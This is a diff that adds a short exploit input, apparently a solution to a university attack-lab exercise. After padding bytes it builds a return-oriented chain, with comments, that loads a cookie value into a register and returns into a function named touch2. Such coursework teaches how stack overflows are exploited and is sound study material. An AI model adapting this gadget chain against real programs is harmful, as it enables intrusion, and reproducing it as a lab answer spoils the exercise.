@@ -1,0 +1,11 @@
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+aa aa aa aa aa aa aa aa
+
+ab 19 40 00 00 00 00 00   /* the start point of gadget1, pop %rax */
+fa 97 b9 59 00 00 00 00   /* the cookie value, which will be stored in %rax after gadget1 */ 
+a2 19 40 00 00 00 00 00   /* the start point of gadget2, mov %rax to %rdi */
+ec 17 40 00 00 00 00 00   /* the address of the touch2 function*/
+
